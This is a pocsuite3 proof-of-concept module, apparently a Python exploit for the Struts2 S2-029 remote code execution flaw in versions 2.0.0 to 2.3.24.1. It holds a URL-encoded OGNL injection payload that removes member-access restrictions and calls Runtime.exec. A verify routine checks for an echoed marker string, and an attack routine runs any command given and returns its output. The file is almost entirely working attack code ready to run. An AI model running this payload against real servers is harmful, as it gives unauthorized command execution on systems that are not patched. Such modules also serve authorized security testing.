from collections import OrderedDict

from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.0.0 - 2.3.24.1'
    name = 'Struts2-029远程代码执行'
    desc = '''Struts2-029远程代码执行'''
    pocDesc = '''Struts2-029远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):

        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = r"(%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtected" \
            r"Access%27]=true,%23_memberAccess[%27excludedPackageNamePatterns%27]=%23_memberAccess[%27acceptProperti" \
            r"es%27],%23_memberAccess[%27excludedClasses%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAcce" \
            r"ss[%27allowPackageProtectedAccess%27]=true,%23_memberAccess[%27allowStaticMethodAccess%27]=true,@org.a" \
            r"pache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27RECOMMAND%27).getInputStream" \
            r"()))"
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.get(url, headers=HEADERS)
            if response and response.status_code == 200 and flag in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = self.get_option("command")
        payload = r"(%23_memberAccess[%27allowPrivateAccess%27]=true,%23_memberAccess[%27allowProtected" \
                  r"Access%27]=true,%23_memberAccess[%27excludedPackageNamePatterns%27]=%23_memberAccess[%27acceptProperti" \
                  r"es%27],%23_memberAccess[%27excludedClasses%27]=%23_memberAccess[%27acceptProperties%27],%23_memberAcce" \
                  r"ss[%27allowPackageProtectedAccess%27]=true,%23_memberAccess[%27allowStaticMethodAccess%27]=true,@org.a" \
                  r"pache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27RECOMMAND%27).getInputStream" \
                  r"()))"
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload

        try:
            response = requests.get(url, headers=HEADERS)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)
